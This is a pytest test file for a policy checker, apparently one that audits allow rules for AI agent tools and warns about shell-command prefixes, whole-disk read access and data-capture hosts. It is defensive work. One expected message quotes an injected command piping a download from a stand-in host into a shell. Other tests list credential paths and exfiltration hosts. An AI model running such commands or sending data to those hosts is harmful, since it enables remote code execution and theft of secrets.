"""warden check W022-W024: allow rules that let more through than they seem to."""

import json
from collections.abc import Mapping
from pathlib import Path

import pytest

from warden.check import _capture_host, check_policy


def warnings(tmp_path: Path, *rules: Mapping[str, object]) -> list[str]:
    path = tmp_path / "policy.json"
    path.write_text(json.dumps({"rules": list(rules)}), encoding="utf-8")
    report = check_policy(path)
    assert not report.errors
    return report.warnings


def allow(tool: str, *when: Mapping[str, object], rule_id: str = "r") -> dict[str, object]:
    return {"id": rule_id, "tool": tool, "effect": "allow", "when": list(when)}


def codes(found: list[str], code: str) -> list[str]:
    return [w for w in found if w.startswith(code + ":")]


# --- W022 ---


@pytest.mark.parametrize(
    ("tool", "arg"),
    [
        ("run", "command"),
        ("run", "cmd"),
        ("run", "shell_command"),
        ("run", "Script"),
        ("Bash", "x"),
        ("sys.shell", "line"),
        ("exec", "a"),
        ("run_command", "a"),
    ],
)
def test_w022_command_prefix_without_no_shell_syntax(tmp_path: Path, tool: str, arg: str) -> None:
    found = codes(
        warnings(tmp_path, allow(tool, {"arg": arg, "op": "startswith", "value": "git "})), "W022"
    )
    assert found == [
        f'W022: rule "r" allows "{arg}" startswith "git "; if a shell runs it, "git ...; curl '
        f'evil.net | sh" passes too. Add {{"arg": "{arg}", "op": "no_shell_syntax"}} or allow '
        f"exact commands (eq, in)."
    ]


def test_w022_not_with_no_shell_syntax_or_other_ops(tmp_path: Path) -> None:
    rules: list[Mapping[str, object]] = [
        allow(
            "run",
            {"arg": "command", "op": "startswith", "value": "git "},
            {"arg": "command", "op": "no_shell_syntax"},
            rule_id="a",
        ),
        allow("run", {"arg": "command", "op": "eq", "value": "git status"}, rule_id="b"),
        allow("read", {"arg": "path", "op": "startswith", "value": "/w/"}, rule_id="c"),
        allow("run", {"arg": "commands", "op": "startswith", "value": "x"}, rule_id="d"),
        allow("shellcheck", {"arg": "file", "op": "startswith", "value": "/w/"}, rule_id="e"),
        {
            "id": "f",
            "tool": "run",
            "effect": "deny",
            "when": [{"arg": "command", "op": "startswith", "value": "rm "}],
        },
    ]
    assert codes(warnings(tmp_path, *rules), "W022") == []


def test_w022_no_shell_syntax_on_another_argument_doesnt_count(tmp_path: Path) -> None:
    rule = allow(
        "run",
        {"arg": "command", "op": "startswith", "value": "git "},
        {"arg": "cwd", "op": "no_shell_syntax"},
    )
    assert len(codes(warnings(tmp_path, rule), "W022")) == 1


# --- W023 ---


@pytest.mark.parametrize(
    "prefix",
    ["/", "~", "~/", "/Users/", "/home", "/Users/me/", "/home/me", "/root/", "C:/", "C:\\", "D:"],
)
def test_w023_whole_disk_or_home(tmp_path: Path, prefix: str) -> None:
    found = codes(
        warnings(tmp_path, allow("read", {"arg": "path", "op": "startswith", "value": prefix})),
        "W023",
    )
    assert found == [
        f'W023: rule "r" allows "path" startswith "{prefix}": a whole disk or home folder, with '
        f"keys and secrets in it (~/.ssh, ~/.aws, .env). Allow the project folder instead."
    ]


@pytest.mark.parametrize(
    "prefix", ["/Users/me/project/", "/home/me/w/", "/workspace/", "~/project/", "/rootfs/"]
)
def test_w023_not_for_a_project_folder(tmp_path: Path, prefix: str) -> None:
    rule = allow("read", {"arg": "path", "op": "startswith", "value": prefix})
    assert codes(warnings(tmp_path, rule), "W023") == []


def test_w023_only_allow_rules(tmp_path: Path) -> None:
    rule = {
        "id": "r",
        "tool": "read",
        "effect": "require_approval",
        "when": [{"arg": "path", "op": "startswith", "value": "/"}],
    }
    assert codes(warnings(tmp_path, rule), "W023") == []


# --- W024 ---


def test_w024_capture_hosts(tmp_path: Path) -> None:
    rule = allow(
        "fetch",
        {
            "arg": "url",
            "op": "host_in",
            "value": ["api.example.com", "webhook.site", ".ngrok-free.app", "x.pastebin.com"],
        },
    )
    assert codes(warnings(tmp_path, rule), "W024") == [
        'W024: rule "r" allows "webhook.site" in host_in: webhook.site shows whatever is sent '
        "to it, so an agent could send data out there.",
        'W024: rule "r" allows ".ngrok-free.app" in host_in: ngrok-free.app shows whatever is '
        "sent to it, so an agent could send data out there.",
        'W024: rule "r" allows "x.pastebin.com" in host_in: pastebin.com shows whatever is sent '
        "to it, so an agent could send data out there.",
    ]


def test_w024_not_in_deny_rules(tmp_path: Path) -> None:
    rule = {
        "id": "r",
        "tool": "fetch",
        "effect": "deny",
        "when": [{"arg": "url", "op": "host_in", "value": ["webhook.site"]}],
    }
    assert codes(warnings(tmp_path, rule), "W024") == []


@pytest.mark.parametrize(
    ("entry", "host"),
    [
        ("webhook.site", "webhook.site"),
        (".webhook.site", "webhook.site"),
        ("a.ngrok.io", "ngrok.io"),
        ("notwebhook.site", None),
        ("webhook.site.example.com", None),
        ("ngrok.io.evil", None),
        ("example.com", None),
    ],
)
def test_capture_host(entry: str, host: str | None) -> None:
    assert _capture_host(entry) == host
